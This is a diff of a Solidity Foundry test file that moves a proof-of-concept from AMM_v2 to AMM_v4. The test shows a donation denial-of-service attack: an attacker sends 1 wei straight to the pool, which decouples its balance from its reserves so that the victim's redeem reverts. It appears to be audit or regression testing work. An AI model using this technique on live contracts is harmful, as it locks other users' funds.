@@ -2,7 +2,7 @@
 pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
-import "versions/AMM_v2.sol" as V2;
+import "versions/AMM_v4.sol" as V4;
 import "versions/lib/IERC20.sol";
 
 contract MockToken is IERC20 {
@@ -21,8 +21,8 @@ contract MockToken is IERC20 {
     }
 }
 
-contract DonationDosV2Test is Test {
-    V2.AMM ammV2;
+contract DonationDosV4Test is Test {
+    V4.AMM ammV4;
     MockToken token0;
     MockToken token1;
     address attacker = address(0x1337);
@@ -31,7 +31,7 @@ contract DonationDosV2Test is Test {
     function setUp() public {
         token0 = new MockToken();
         token1 = new MockToken();
-        ammV2 = new V2.AMM(IERC20(address(token0)), IERC20(address(token1)));
+        ammV4 = new V4.AMM(IERC20(address(token0)), IERC20(address(token1)));
 
         token0.transfer(attacker, 10000);
         token1.transfer(attacker, 10000);
@@ -39,13 +39,13 @@ contract DonationDosV2Test is Test {
         token1.transfer(victim, 10000);
 
         vm.startPrank(attacker);
-        token0.approve(address(ammV2), type(uint256).max);
-        token1.approve(address(ammV2), type(uint256).max);
+        token0.approve(address(ammV4), type(uint256).max);
+        token1.approve(address(ammV4), type(uint256).max);
         vm.stopPrank();
 
         vm.startPrank(victim);
-        token0.approve(address(ammV2), type(uint256).max);
-        token1.approve(address(ammV2), type(uint256).max);
+        token0.approve(address(ammV4), type(uint256).max);
+        token1.approve(address(ammV4), type(uint256).max);
         vm.stopPrank();
     }
 
@@ -55,25 +55,25 @@ contract DonationDosV2Test is Test {
     // PoC:
     // - Step 1 (setup): The victim deposits tokens to initialize the pool. The attacker then transfers 1 wei directly to the contract (donation), causing the real balance to decouple from the internal reserves.
     // - Step 2 (attack): The victim attempts to redeem their liquidity tokens. The transaction reverts due to strict equality checks, locking the funds (DoS).
-    function test_donation_dos_attack_v2() public {
+    function test_donation_dos_attack_v4() public {
         vm.startPrank(victim);
-        ammV2.deposit(10000, 10000);
+        ammV4.deposit(10000, 10000);
         vm.stopPrank();
 
-        assertEq(ammV2.r0(), 10000);
-        assertEq(ammV2.r1(), 10000);
+        assertEq(ammV4.r0(), 10000);
+        assertEq(ammV4.r1(), 10000);
 
         vm.startPrank(attacker);
-        token0.transfer(address(ammV2), 1);
+        token0.transfer(address(ammV4), 1);
         vm.stopPrank();
 
-        assertEq(token0.balanceOf(address(ammV2)), 10001);
-        assertEq(ammV2.r0(), 10000);
+        assertEq(token0.balanceOf(address(ammV4)), 10001);
+        assertEq(ammV4.r0(), 10000);
 
         vm.startPrank(victim);
 
         vm.expectRevert();
-        ammV2.redeem(10000);
+        ammV4.redeem(10000);
 
         vm.stopPrank();
     }
